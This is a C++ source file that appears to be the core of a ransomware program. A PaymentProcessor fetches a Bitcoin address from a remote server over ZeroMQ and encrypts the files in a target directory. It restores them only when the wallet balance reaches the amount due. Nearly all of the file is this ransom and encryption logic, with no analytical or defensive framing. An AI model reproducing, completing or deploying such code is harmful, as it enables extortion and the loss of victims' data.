#include <bitcoin/bitcoin.hpp>
#include <zmq.hpp>

#include "PaymentProcessor.h"
#include "wallet.h"
#include "addressServer.h"

PaymentProcessor::PaymentProcessor(const char *targetDir)
{
    zmq::context_t context(1);
    zmq::socket_t socket(context, ZMQ_REQ);
    zmq::message_t request, reply;

    encryptor = new Crypt();
    this->targetDir = targetDir;

    socket.connect(serverAddress.data());
    socket.send(request);
    socket.recv(&reply);

    this->address = bc::wallet::payment_address(std::string((char*)reply.data(), reply.size()));
}

std::string PaymentProcessor::getAddress()
{
    return address.encoded();
}

int PaymentProcessor::encryptFiles()
{
    return encryptor->encryptFiles(targetDir);
}

int PaymentProcessor::tryDecrypt()
{
    if (Wallet::getBalance(address) >= amountDue)
    {
        delete encryptor;
        encryptor = new Crypt((char*)"keyfile");
        return encryptor->encryptFiles(targetDir);
    } else
        return -1;
}
